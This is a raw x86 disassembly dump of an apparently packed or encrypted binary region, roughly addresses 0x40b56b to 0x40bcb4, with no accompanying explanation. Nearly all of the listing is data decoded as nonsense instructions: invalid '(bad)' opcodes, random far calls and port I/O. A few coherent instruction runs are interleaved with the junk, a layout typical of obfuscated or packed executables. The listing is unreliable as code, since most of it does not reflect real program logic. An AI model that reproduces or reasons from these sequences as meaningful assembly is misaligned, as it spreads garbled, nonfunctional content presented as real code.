  40b56b:	repnz pop es
  40b56d:	stos   DWORD PTR es:[edi],eax
  40b56e:	or     al,0x72
  40b570:	add    esi,DWORD PTR [eax-0x33767e85]
  40b576:	dec    eax
  40b577:	and    eax,0x3c4267c8
  40b57c:	fwait
  40b57d:	lea    ecx,[ebx+0x7a0e8b6a]
  40b583:	pop    eax
  40b584:	das    
  40b585:	sub    BYTE PTR [ebx],dl
  40b587:	jge    0x40b5b7
  40b589:	xchg   ebx,eax
  40b58a:	pop    es
  40b58b:	adc    bl,al
  40b58d:	xor    edx,DWORD PTR [esi+edi*2]
  40b590:	out    dx,eax
  40b591:	jns    0x40b51a
  40b593:	pop    ss
  40b594:	or     ch,BYTE PTR [edx]
  40b596:	outs   dx,DWORD PTR ds:[esi]
  40b597:	xor    ch,0xf3
  40b59a:	inc    ebp
  40b59b:	(bad)  
  40b59c:	adc    al,0xb8
  40b59e:	xor    bh,BYTE PTR [ebp-0x2489dca]
  40b5a4:	call   0xb1cf:0x2d54cd0f
  40b5ab:	out    0x62,al
  40b5ad:	(bad)  
  40b5ae:	sbb    al,0x7e
  40b5b0:	scas   eax,DWORD PTR es:[edi]
  40b5b1:	inc    ecx
  40b5b2:	and    al,0xc2
  40b5b4:	xchg   bx,ax
  40b5b6:	hlt    
  40b5b7:	adc    BYTE PTR [edi],0x66
  40b5ba:	repnz fs shl esi,1
  40b5be:	and    esi,DWORD PTR [si]
  40b5c1:	test   eax,0x177f97e1
  40b5c6:	xchg   BYTE PTR [edx],ah
  40b5c8:	mov    bh,0x17
  40b5ca:	imul   ebx,DWORD PTR [eax],0xd8bedf65
  40b5d0:	std    
  40b5d1:	pop    ss
  40b5d2:	ins    DWORD PTR es:[edi],dx
  40b5d3:	sub    ebp,DWORD PTR [edi]
  40b5d5:	xchg   BYTE PTR [ebx],dh
  40b5d7:	cmp    BYTE PTR [eax+edx*1-0x41],ch
  40b5db:	mov    ecx,0x63dc8526
  40b5e0:	xor    DWORD PTR [ebx-0x98aacda],edx
  40b5e6:	lods   al,BYTE PTR ds:[esi]
  40b5e7:	mov    esp,0xdbce91b5
  40b5ec:	jl     0x40b65b
  40b5ee:	sub    al,0xca
  40b5f0:	pushf  
  40b5f1:	mov    ebx,0xd943d626
  40b5f6:	pop    ds
  40b5f7:	dec    edi
  40b5f8:	es out dx,eax
  40b5fa:	iret   
  40b5fb:	jae    0x40b661
  40b5fd:	mov    bh,0xd9
  40b5ff:	mov    bl,al
  40b601:	adc    BYTE PTR [edi+0xa],cl
  40b604:	jo     0x40b628
  40b606:	fs out 0xe5,al
  40b609:	mov    esp,0x548dcd9
  40b60e:	and    eax,0xe8b46437
  40b613:	rcr    DWORD PTR [ecx-0x16ab861c],cl
  40b619:	pop    edi
  40b61a:	pop    eax
  40b61b:	cdq    
  40b61c:	sub    al,0xcd
  40b61e:	xchg   edx,eax
  40b61f:	or     bl,BYTE PTR [edi+0x3e7a35cd]
  40b625:	test   esi,esi
  40b627:	push   ss
  40b628:	(bad)  
  40b629:	not    DWORD PTR [eax+0x57]
  40b62c:	aas    
  40b62d:	and    eax,0x30b03676
  40b632:	xchg   ebx,eax
  40b633:	add    dl,ah
  40b635:	xchg   ebx,eax
  40b636:	xchg   BYTE PTR ds:0xef53c796,ch
  40b63c:	inc    ebp
  40b63d:	fisub  WORD PTR [ebp-0x452274b8]
  40b643:	push   esi
  40b644:	pop    ss
  40b645:	mov    dh,0x39
  40b647:	jmp    0x40b661
  40b649:	jns    0x40b62f
  40b64b:	dec    ebp
  40b64c:	mov    esi,0xcdb8c2c3
  40b651:	into   
  40b652:	jnp    0x40b682
  40b654:	xor    BYTE PTR [edx+0x6b934b76],0x9c
  40b65b:	imul   ebp,DWORD PTR [edi+0x5eba492a],0x7a3b18bb
  40b665:	mov    cl,0x25
  40b667:	rol    BYTE PTR [edi-0x34],cl
  40b66a:	aad    0x98
  40b66c:	cwde   
  40b66d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b66e:	je     0x40b677
  40b670:	inc    eax
  40b671:	pop    edx
  40b672:	dec    ebp
  40b673:	pop    eax
  40b674:	sbb    esp,ecx
  40b676:	add    BYTE PTR [esi+edx*4-0x1135d973],ch
  40b67d:	mov    ebx,0x3d99a75f
  40b682:	sbb    DWORD PTR [edx-0x12],esi
  40b685:	and    DWORD PTR [edi-0x313808b7],0xffffffc3
  40b68c:	fiadd  DWORD PTR [edi-0x33]
  40b68f:	adc    bh,BYTE PTR [esp+ebp*1+0x1d]
  40b693:	push   es
  40b694:	sbb    esp,DWORD PTR [ebx]
  40b696:	scas   al,BYTE PTR es:[edi]
  40b697:	sbb    dh,BYTE PTR [esi+ebx*4-0x435d92f5]
  40b69e:	mov    edi,0x97ec6a8a
  40b6a3:	push   cs
  40b6a4:	pop    edx
  40b6a5:	sti    
  40b6a6:	dec    esi
  40b6a7:	pop    esi
  40b6a8:	or     eax,0x338bea5c
  40b6ad:	push   ecx
  40b6ae:	sub    eax,0xf0458b52
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0x82
  40b6da:	loopne 0x40b6a4
  40b6dc:	fstp   st(1)
  40b6de:	bnd jle 0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b687
  40b6e6:	xchg   esp,eax
  40b6e7:	add    eax,0x5445b7cd
  40b6ec:	inc    esp
  40b6ed:	lahf   
  40b6ee:	add    DWORD PTR [eax-0x75158b63],ecx
  40b6f4:	repnz sub BYTE PTR [edi],ah
  40b6f7:	xchg   ebp,eax
  40b6f8:	mov    esp,0x11f8d2f7
  40b6fd:	xor    dh,BYTE PTR [edx+0x73]
  40b700:	pushf  
  40b701:	or     DWORD PTR [esi],0x5c
  40b704:	out    0x12,al
  40b706:	and    eax,0x75df29a5
  40b70b:	pop    eax
  40b70c:	test   BYTE PTR [eax],al
  40b70e:	call   0x9f7ddde8
  40b713:	jne    0x40b705
  40b715:	jle    0x40b742
  40b717:	cdq    
  40b718:	mov    es,WORD PTR [ecx+0x434e31ed]
  40b71e:	xor    DWORD PTR [esi],esi
  40b720:	xchg   DWORD PTR [ebp+edx*2-0xd],esi
  40b724:	push   esp
  40b725:	cmp    eax,0xd091dc0
  40b72a:	cmp    al,0x63
  40b72c:	push   edx
  40b72d:	sbb    eax,0xa1d626a0
  40b732:	sub    edx,DWORD PTR [edi-0x52]
  40b735:	imul   ebx,DWORD PTR [esi],0x23
  40b738:	push   ds
  40b739:	repz aaa 
  40b73b:	jno    0x40b748
  40b73d:	mov    dl,0xdd
  40b73f:	aam    0xc0
  40b741:	and    BYTE PTR [eax-0x34],dl
  40b744:	imul   ebp,edx,0xffffffb5
  40b747:	in     eax,0xb2
  40b749:	pop    ss
  40b74a:	in     eax,0xaa
  40b74c:	(bad)  
  40b74e:	xor    ebx,eax
  40b750:	test   DWORD PTR [esi+0x3],0xe1390edd
  40b757:	inc    ebx
  40b758:	sub    al,0x4e
  40b75a:	add    eax,0x99b21396
  40b75f:	jb     0x40b76a
  40b761:	aad    0x2c
  40b763:	sar    DWORD PTR [ecx],1
  40b765:	ds cli 
  40b767:	mov    edx,0x7f807998
  40b76c:	xor    edi,ebp
  40b76e:	aam    0xf3
  40b770:	call   0x91d:0x2c74697e
  40b777:	sti    
  40b778:	enter  0xc66b,0xa3
  40b77c:	cld    
  40b77d:	popa   
  40b77e:	push   esi
  40b77f:	enter  0xa32a,0xac
  40b783:	loope  0x40b79b
  40b785:	lahf   
  40b786:	hlt    
  40b787:	and    cl,BYTE PTR [esp+eax*4+0x4db81b75]
  40b78e:	sti    
  40b78f:	or     BYTE PTR [esi-0x8b7e0e7],bh
  40b795:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b797:	and    eax,0x15e1c4b8
  40b79c:	mov    dh,0xb5
  40b79e:	stos   DWORD PTR es:[edi],eax
  40b79f:	mov    esi,0xd37b583e
  40b7a4:	push   edi
  40b7a5:	(bad)  
  40b7a7:	push   ecx
  40b7a8:	imul   esp,DWORD PTR [ecx-0xff03fda],0xffffffbd
  40b7af:	cs in  al,dx
  40b7b1:	jnp    0x40b751
  40b7b3:	mov    dl,0x96
  40b7b5:	mov    dh,0xf
  40b7b7:	fdiv   QWORD PTR [esi]
  40b7b9:	xor    ebp,ebp
  40b7bb:	cmp    BYTE PTR [ebp+0x108e06b5],bh
  40b7c1:	call   0x9248:0xaed2e136
  40b7c8:	xchg   esi,eax
  40b7c9:	mov    edi,0xbc116fbe
  40b7ce:	and    BYTE PTR es:[eax],0xd9
  40b7d2:	ja     0x40b7ff
  40b7d4:	push   ebx
  40b7d5:	jns    0x40b7b9
  40b7d7:	(bad)  
  40b7d9:	mov    edx,0x24aaa666
  40b7de:	jle    0x40b7cc
  40b7e0:	loop   0x40b844
  40b7e2:	or     eax,0x3fec1e21
  40b7e7:	pop    ebx
  40b7e8:	xchg   ebx,eax
  40b7e9:	jb     0x40b7fd
  40b7eb:	call   0x98a47026
  40b7f0:	xchg   edi,eax
  40b7f1:	dec    esi
  40b7f2:	or     bl,cl
  40b7f4:	jno    0x40b79b
  40b7f6:	fistp  DWORD PTR [ecx]
  40b7f8:	test   DWORD PTR [edi-0x5c],esi
  40b7fb:	cmp    bh,BYTE PTR [ebp-0x7de5a972]
  40b801:	iret   
  40b802:	add    ah,BYTE PTR [esi+0x39]
  40b805:	pop    edx
  40b806:	inc    esi
  40b807:	pop    esp
  40b808:	mov    ds:0xf92ed3b,eax
  40b80d:	jmp    0xfa48:0x2d73f632
  40b814:	(bad)  
  40b815:	aas    
  40b816:	fstp   TBYTE PTR [edi-0x4901d2bf]
  40b81c:	mov    bl,BYTE PTR [edx]
  40b81e:	repz sub BYTE PTR [ecx+esi*8],ah
  40b822:	add    bh,BYTE PTR [edi]
  40b824:	cwde   
  40b825:	jp     0x40b88f
  40b827:	jle    0x40b7bb
  40b829:	xchg   cl,dh
  40b82b:	stc    
  40b82c:	gs retf 
  40b82e:	push   eax
  40b82f:	div    BYTE PTR [ecx+eiz*1+0x22face81]
  40b836:	or     DWORD PTR [ebx+0xe87d720],esi
  40b83c:	fld    TBYTE PTR [ebx+0xd]
  40b83f:	sbb    BYTE PTR [esi+0x5],cl
  40b842:	ficom  DWORD PTR [eax]
  40b844:	adc    DWORD PTR [esi],edx
  40b846:	push   edi
  40b847:	xlat   BYTE PTR ds:[ebx]
  40b848:	pop    ebp
  40b849:	ficomp WORD PTR [esp+edi*1]
  40b84c:	cmp    BYTE PTR [esi+0x23c7f973],bh
  40b852:	sub    DWORD PTR [edi],esi
  40b854:	push   edi
  40b855:	pusha  
  40b856:	xor    ah,dl
  40b858:	and    eax,0xb560b53a
  40b85d:	mov    dh,0x83
  40b85f:	or     BYTE PTR [esi-0xa155e9],0x8c
  40b866:	(bad)  
  40b867:	in     al,0xcb
  40b869:	jecxz  0x40b895
  40b86b:	das    
  40b86c:	out    dx,eax
  40b86d:	sub    BYTE PTR [ebp+0x3620a781],0x30
  40b874:	pop    esi
  40b875:	int    0x2c
  40b877:	mov    WORD PTR [edx-0x3b],?
  40b87a:	sbb    ch,BYTE PTR [esi+0x13]
  40b87d:	pop    esi
  40b87e:	and    esp,edx
  40b880:	(bad)  
  40b881:	mov    ds:0xa531ae17,eax
  40b886:	xor    edi,ecx
  40b888:	jns    0x40b8a2
  40b88a:	push   esp
  40b88b:	cdq    
  40b88c:	xchg   eax,esp
  40b88e:	pop    eax
  40b88f:	in     al,0x3
  40b891:	sbb    ch,BYTE PTR [esi]
  40b893:	mov    al,ds:0x10d78cd3
  40b898:	addr16 pushf 
  40b89a:	aaa    
  40b89b:	sbb    BYTE PTR [ecx+0x3b],bl
  40b89e:	jns    0x40b8a7
  40b8a0:	cmp    ebx,eax
  40b8a2:	xor    BYTE PTR [edi-0x71],dl
  40b8a5:	xchg   ebp,eax
  40b8a6:	and    DWORD PTR [edi+0x5e],esi
  40b8a9:	pop    esp
  40b8aa:	jmp    0x40b845
  40b8ac:	fstp   TBYTE PTR [ebx+ecx*2]
  40b8af:	iret   
  40b8b0:	(bad)  [ebx+edx*8-0x79]
  40b8b4:	jne    0x40b914
  40b8b6:	aas    
  40b8b7:	out    dx,al
  40b8b8:	adc    DWORD PTR ds:0x2acb2ac1,eax
  40b8be:	jb     0x40b847
  40b8c0:	clc    
  40b8c1:	daa    
  40b8c2:	adc    BYTE PTR [eax],bh
  40b8c4:	xor    eax,0x38b1e62b
  40b8c9:	jg     0x40b89c
  40b8cb:	loop   0x40b8fa
  40b8cd:	les    ecx,FWORD PTR [esi+edx*1+0x56a244f0]
  40b8d4:	repz (bad) 
  40b8d6:	arpl   WORD PTR [ebx],cx
  40b8d8:	fidiv  WORD PTR ds:0xfee831d7
  40b8de:	pop    es
  40b8df:	sti    
  40b8e0:	sub    eax,ebx
  40b8e2:	ins    DWORD PTR es:[edi],dx
  40b8e3:	cmp    ebp,DWORD PTR [esi-0x7c]
  40b8e6:	inc    esp
  40b8e7:	ror    BYTE PTR [ebp+0x1a],1
  40b8ea:	jmp    0x12323dea
  40b8ef:	adc    al,0xc8
  40b8f1:	or     dl,ch
  40b8f3:	xchg   esp,eax
  40b8f4:	pop    ss
  40b8f5:	daa    
  40b8f6:	adc    al,0xf8
  40b8f8:	push   esi
  40b8f9:	push   edx
  40b8fa:	rcl    ch,cl
  40b8fc:	xchg   DWORD PTR [edi],ebp
  40b8fe:	adc    al,0x30
  40b900:	sbb    al,0xcf
  40b902:	inc    BYTE PTR ds:0x69e945c1
  40b908:	lea    ebp,[ecx]
  40b90a:	add    eax,0x77eec6c8
  40b90f:	arpl   WORD PTR [eax+0x12],bp
  40b912:	jmp    0x40b96e
  40b914:	(bad)  
  40b915:	or     al,0x4c
  40b917:	cs push ds
  40b919:	mov    ch,0x37
  40b91b:	mov    dh,BYTE PTR [edi-0x58]
  40b91e:	jge    0x40b98c
  40b920:	jp     0x40b8fd
  40b922:	jnp    0x40b8c1
  40b924:	push   esp
  40b925:	push   ebx
  40b926:	repz cmp BYTE PTR [esi-0x51],bl
  40b92a:	push   edi
  40b92b:	mov    BYTE PTR [ecx+0x79],ah
  40b92e:	push   ebx
  40b92f:	lahf   
  40b930:	and    eax,0x90d95518
  40b935:	xchg   ebx,eax
  40b936:	add    ecx,DWORD PTR [edx]
  40b938:	les    ebp,FWORD PTR [bp+si+0xf]
  40b93c:	mov    esp,0x9ef2e538
  40b941:	popf   
  40b942:	sbb    bh,ah
  40b944:	jl     0x40b91d
  40b946:	test   BYTE PTR [esi+eiz*8+0x2b2ed554],0xf8
  40b94e:	dec    eax
  40b94f:	test   DWORD PTR [ebp+0x1],ebx
  40b952:	xor    eax,0x7eaa6616
  40b957:	cs xchg ebx,eax
  40b959:	scas   al,BYTE PTR es:[edi]
  40b95a:	int3   
  40b95b:	sub    dh,BYTE PTR [eax-0x3c]
  40b95e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b95f:	pop    esi
  40b960:	xor    al,0xc9
  40b962:	cmc    
  40b963:	sub    eax,0xe86304d0
  40b968:	mov    edx,0x163be3ee
  40b96d:	xchg   esi,eax
  40b96e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b96f:	xchg   esi,eax
  40b970:	mov    eax,ds:0xcb6ef6b8
  40b975:	jnp    0x40b9f0
  40b977:	pop    edi
  40b978:	(bad)  
  40b979:	aam    0xb
  40b97b:	fbld   TBYTE PTR [eax*4-0xb65d01d]
  40b982:	or     eax,0xe67b0b83
  40b987:	jo     0x40b977
  40b989:	pop    edi
  40b98a:	stos   BYTE PTR es:[edi],al
  40b98b:	hlt    
  40b98c:	fwait
  40b98d:	cli    
  40b98e:	sub    BYTE PTR [ebp+0x4b77d6f6],dh
  40b994:	jnp    0x40b9e7
  40b996:	(bad)  
  40b997:	mov    ecx,0x7e575886
  40b99c:	jecxz  0x40b96d
  40b99e:	xchg   ah,cl
  40b9a0:	stc    
  40b9a1:	mov    esp,db4
  40b9a4:	into   
  40b9a5:	lods   al,BYTE PTR ds:[esi]
  40b9a6:	mov    eax,0x29ffdcea
  40b9ab:	sub    ebp,DWORD PTR [edi-0x38aac474]
  40b9b1:	rcl    DWORD PTR [edi],0x5
  40b9b4:	je     0x40b982
  40b9b6:	pop    es
  40b9b7:	jecxz  0x40b9c7
  40b9b9:	(bad)
  40b9bc:	push   edi
  40b9bd:	rol    ebx,0x15
  40b9c0:	pushw  0x48
  40b9c3:	in     al,dx
  40b9c4:	jge    0x40b9f7
  40b9c6:	or     edi,DWORD PTR [eax+0x5a]
  40b9c9:	popa   
  40b9ca:	pop    es
  40b9cb:	push   es
  40b9cc:	fld    QWORD PTR ds:0xf0cd6fbc
  40b9d2:	pop    ecx
  40b9d3:	inc    eax
  40b9d4:	(bad)  ds:[bx+0x77]
  40b9d9:	call   0xe874:0x777e5828
  40b9e0:	dec    edi
  40b9e1:	call   0x915b969
  40b9e6:	retf   0xa7ba
  40b9e9:	retf   
  40b9ea:	push   ecx
  40b9eb:	mov    ecx,0xef76957d
  40b9f0:	mov    ds:0xa8781a39,eax
  40b9f5:	mov    ah,BYTE PTR [ebx-0x14]
  40b9f8:	arpl   WORD PTR [ecx+0x15],di
  40b9fb:	push   eax
  40b9fc:	push   ebx
  40b9fd:	push   ds
  40b9fe:	popf   
  40b9ff:	cmp    eax,0xaaac0b9
  40ba04:	mov    ch,0xe0
  40ba06:	jo     0x40ba0a
  40ba08:	mov    bh,BYTE PTR [ecx]
  40ba0a:	mov    ds:0x27965fbe,eax
  40ba0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba10:	xor    eax,0x588e9720
  40ba15:	mov    cx,WORD PTR [ebp-0x4]
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	ss cld 
  40ba37:	inc    edx
  40ba38:	call   0x7d2e:0x7e7ef189
  40ba3f:	jle    0x40babf
  40ba41:	mov    eax,0xa4d80a0b
  40ba46:	push   edx
  40ba47:	int    0x18
  40ba49:	retf   
  40ba4a:	add    ah,BYTE PTR [esi+edi*2-0x3f56ea4c]
  40ba51:	popf   
  40ba52:	lods   eax,DWORD PTR ds:[esi]
  40ba53:	dec    esi
  40ba54:	cdq    
  40ba55:	adc    al,0x94
  40ba57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba58:	jle    0x40b9df
  40ba5a:	pop    eax
  40ba5b:	or     BYTE PTR ss:[esi-0x357de46f],0x41
  40ba63:	pop    eax
  40ba64:	daa    
  40ba65:	inc    ebx
  40ba66:	mov    edx,0xb5c2bfee
  40ba6b:	xlat   BYTE PTR ds:[ebx]
  40ba6c:	and    ebp,edx
  40ba6e:	sub    al,0xcd
  40ba70:	push   cs
  40ba71:	adc    DWORD PTR [edi+eax*8],eax
  40ba74:	hlt    
  40ba75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba76:	(bad)  
  40ba77:	leave  
  40ba78:	mov    WORD PTR [ecx+0x41],es
  40ba7b:	jns    0x40bacd
  40ba7d:	or     eax,0xe3578466
  40ba82:	jmp    0x40bad6
  40ba84:	icebp  
  40ba85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba87:	push   ds
  40ba88:	cs mov al,0x33
  40ba8b:	fisubr WORD PTR [esi-0x2fe0840a]
  40ba91:	and    ebp,ebx
  40ba93:	es addr16 leave 
  40ba96:	mov    edi,0x51efea66
  40ba9b:	fwait
  40ba9c:	push   cs
  40ba9d:	fidiv  WORD PTR [edx+0x1e]
  40baa0:	or     al,0xc1
  40baa2:	sbb    edi,DWORD PTR [edi]
  40baa4:	mov    al,ds:0xbf923f69
  40baa9:	adc    DWORD PTR [eax+0x71],eax
  40baac:	cmp    BYTE PTR [ebx+0x2b],0x23
  40bab0:	mov    esp,0x16a9d162
  40bab5:	adc    DWORD PTR [ecx-0x1e],ecx
  40bab8:	mov    cl,0xea
  40baba:	mov    cl,0x1
  40babc:	ss inc eax
  40babe:	jmp    0xde7e093e
  40bac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bac4:	mov    ds:0xf44e9055,eax
  40bac9:	(bad)  
  40baca:	(bad)  
  40bacb:	cmp    bh,BYTE PTR [ebx]
  40bacd:	jge    0x40ba62
  40bacf:	inc    edx
  40bad0:	pop    edx
  40bad1:	or     al,BYTE PTR [edx]
  40bad3:	pusha  
  40bad4:	dec    ecx
  40bad5:	stos   BYTE PTR es:[di],al
  40bad7:	pusha  
  40bad8:	ret    
  40bad9:	pop    ss
  40bada:	lods   eax,DWORD PTR ds:[esi]
  40badb:	cdq    
  40badc:	push   ds
  40badd:	ss test edx,esp
  40bae0:	aas    
  40bae1:	push   edx
  40bae2:	mov    ds:0x758e1f1e,al
  40bae7:	nop
  40bae8:	inc    ebx
  40bae9:	mov    edx,0xe6aaaa8f
  40baee:	retf   
  40baef:	dec    esp
  40baf0:	(bad)
  40baf5:	ja     0x40baa9
  40baf7:	test   BYTE PTR [eax+0x7650f626],ah
  40bafd:	sbb    ebp,DWORD PTR [eax+0x70]
  40bb00:	jecxz  0x40bb28
  40bb02:	xor    BYTE PTR [edx+0x1],al
  40bb05:	lods   eax,DWORD PTR ds:[esi]
  40bb06:	push   esi
  40bb07:	jmp    0x40ba99
  40bb09:	inc    ecx
  40bb0a:	lahf   
  40bb0b:	inc    eax
  40bb0c:	sbb    ah,BYTE PTR [esi+0x5fc46682]
  40bb12:	pop    edi
  40bb13:	test   DWORD PTR [ecx-0x37],ebp
  40bb16:	and    al,BYTE PTR [ebp+0x4a]
  40bb19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb1a:	not    DWORD PTR [ebp+0x72b3d6f0]
  40bb20:	stos   DWORD PTR es:[edi],eax
  40bb21:	inc    eax
  40bb22:	pop    esi
  40bb23:	jl     0x40bb39
  40bb25:	push   0xa96736b9
  40bb2a:	neg    BYTE PTR [eax]
  40bb2c:	imul   ah
  40bb2e:	fadd   st(1),st
  40bb30:	jae    0x40bb81
  40bb32:	dec    eax
  40bb33:	outs   dx,DWORD PTR ds:[esi]
  40bb34:	mov    BYTE PTR [ebp+0x7937da68],cl
  40bb3a:	in     eax,0x1f
  40bb3c:	loopne 0x40bac6
  40bb3e:	inc    edi
  40bb3f:	rol    DWORD PTR [edi+ebp*2+0x35],cl
  40bb43:	push   ebp
  40bb44:	sbb    DWORD PTR [eax+0x4af32117],esp
  40bb4a:	push   edi
  40bb4b:	es out dx,eax
  40bb4d:	in     al,0x43
  40bb4f:	leave  
  40bb50:	xchg   ebx,eax
  40bb51:	pop    edi
  40bb52:	sbb    al,BYTE PTR [eax+ebx*8-0x5ba470c2]
  40bb59:	xor    BYTE PTR [eax-0x44],0x70
  40bb5d:	jp     0x40bb7e
  40bb5f:	cdq    
  40bb60:	pushf  
  40bb61:	mov    ebx,0x2fadf16b
  40bb66:	xchg   esi,eax
  40bb67:	(bad)  
  40bb68:	nop
  40bb69:	inc    esp
  40bb6a:	loope  0x40bb0f
  40bb6c:	and    dl,BYTE PTR [eax+0x6d]
  40bb6f:	call   0x58ee:0x18c30db7
  40bb76:	xchg   ebp,eax
  40bb77:	sbb    dl,BYTE PTR [ebx]
  40bb79:	xchg   ebx,eax
  40bb7a:	and    bl,bl
  40bb7c:	out    0x1e,eax
  40bb7e:	jmp    0x2125c034
  40bb83:	jecxz  0x40bb22
  40bb85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb86:	fsubr  st,st(3)
  40bb88:	sub    edi,ebp
  40bb8a:	xchg   bh,cl
  40bb8c:	pop    ebp
  40bb8d:	push   cs
  40bb8e:	rcl    DWORD PTR [edx],cl
  40bb90:	cli    
  40bb91:	das    
  40bb92:	pop    eax
  40bb93:	cmp    al,0xd5
  40bb95:	adc    al,0xc8
  40bb97:	fcmovne st,st(5)
  40bb99:	or     BYTE PTR [esi+0x11a9065b],bl
  40bb9f:	sbb    DWORD PTR [esi+ebp*4+0x41f50e6d],eax
  40bba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bba7:	(bad)  
  40bba8:	jmp    0x40bb8d
  40bbaa:	xchg   edi,eax
  40bbab:	sahf   
  40bbac:	lahf   
  40bbad:	dec    edx
  40bbae:	jg     0x40bc24
  40bbb0:	push   edx
  40bbb1:	test   al,0xef
  40bbb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbb4:	call   0xc0cc4ee
  40bbb9:	daa    
  40bbba:	js     0x40bb64
  40bbbc:	push   es
  40bbbd:	lahf   
  40bbbe:	pop    ecx
  40bbbf:	(bad)  
  40bbc1:	mov    eax,0x23a5df86
  40bbc6:	retf   0xbc60
  40bbc9:	xchg   DWORD PTR [ebx],edx
  40bbcb:	xchg   bl,bl
  40bbcd:	cmp    DWORD PTR [eax+ebx*2],eax
  40bbd0:	push   eax
  40bbd1:	out    dx,eax
  40bbd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbd3:	lock pop ecx
  40bbd5:	les    esi,FWORD PTR [ebp+esi*1+0x1]
  40bbd9:	inc    ecx
  40bbda:	lahf   
  40bbdb:	mov    al,ds:0x907d567d
  40bbe0:	clc    
  40bbe1:	push   0x24babba2
  40bbe6:	(bad)  
  40bbe7:	adc    DWORD PTR [ecx+ecx*1],esi
  40bbea:	daa    
  40bbeb:	fdiv   DWORD PTR [ebp+ebp*1-0x42]
  40bbef:	mov    ds:0x4a182fef,al
  40bbf4:	rcr    BYTE PTR [esi-0x7c],cl
  40bbf7:	lea    esi,[ebp+0x6ca9a838]
  40bbfd:	add    esi,DWORD PTR [ebp-0x31]
  40bc00:	inc    ecx
  40bc01:	push   ebp
  40bc02:	xchg   esi,eax
  40bc03:	mov    ecx,0x63770ec2
  40bc08:	and    eax,0x28f541b2
  40bc0d:	jp     0x40bbdc
  40bc0f:	jmp    0xd682:0x414187cb
  40bc16:	lods   eax,DWORD PTR ds:[esi]
  40bc17:	mov    bl,0x57
  40bc19:	mov    eax,0xed23b00f
  40bc1e:	stos   BYTE PTR es:[edi],al
  40bc1f:	mov    ds,WORD PTR [eax]
  40bc21:	fwait
  40bc22:	call   0xec6f:0x39e0ebbb
  40bc29:	hlt    
  40bc2a:	sub    eax,0x16e31969
  40bc2f:	aas    
  40bc30:	and    al,0xbc
  40bc32:	or     DWORD PTR [edx-0x1f],ecx
  40bc35:	jg     0x40bbdf
  40bc37:	cwde   
  40bc38:	adc    al,0x44
  40bc3a:	cwde   
  40bc3b:	(bad)  
  40bc3c:	xor    eax,0x285fdec6
  40bc41:	out    0xb8,eax
  40bc43:	jo     0x40bc6e
  40bc45:	adc    edx,edx
  40bc47:	cdq    
  40bc48:	jnp    0x40bcc4
  40bc4a:	jmp    0xecf5cae
  40bc4f:	icebp  
  40bc50:	sbb    al,0xda
  40bc52:	pop    es
  40bc53:	sub    BYTE PTR [edx-0x1],bh
  40bc56:	push   ebx
  40bc57:	xchg   esp,eax
  40bc58:	sub    dl,BYTE PTR [eax]
  40bc5a:	pop    esp
  40bc5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc5c:	cli    
  40bc5d:	mov    cs,ebx
  40bc5f:	add    al,BYTE PTR [edi]
  40bc61:	cmp    edi,DWORD PTR [esi+ebx*1-0x38]
  40bc65:	adc    edi,DWORD PTR ds:0x901148ca
  40bc6b:	in     eax,dx
  40bc6c:	pop    ebp
  40bc6e:	add    al,dl
  40bc70:	or     eax,0xd5097c85
  40bc75:	or     eax,0xe02fbaad
  40bc7a:	add    edx,edx
  40bc7c:	jle    0x40bcfc
  40bc7e:	and    al,0x58
  40bc80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc81:	cmp    edi,esi
  40bc83:	sbb    DWORD PTR [eax],ecx
  40bc85:	push   ds
  40bc86:	jp     0x40bc12
  40bc88:	aas    
  40bc89:	xchg   esi,eax
  40bc8a:	xchg   bl,cl
  40bc8c:	fwait
  40bc8d:	std    
  40bc8e:	ss push esp
  40bc90:	outs   dx,DWORD PTR ds:[esi]
  40bc91:	std    
  40bc92:	dec    eax
  40bc93:	ficom  DWORD PTR [esi]
  40bc95:	adc    eax,0x736abf6a
  40bc9a:	cmp    BYTE PTR [esi],ah
  40bc9c:	mov    ch,0xb9
  40bc9e:	mov    al,bl
  40bca0:	(bad)  
  40bca1:	mov    esi,0xf34dfe4d
  40bca6:	xor    edi,DWORD PTR [ebx+0x2de5ba83]
  40bcac:	sub    al,0x9d
  40bcae:	or     al,0xf6
  40bcb0:	ret    
  40bcb1:	or     al,0x48
  40bcb3:	xchg   esp,eax
  40bcb4:	mov    dh,BYTE PTR [edi+0x37]
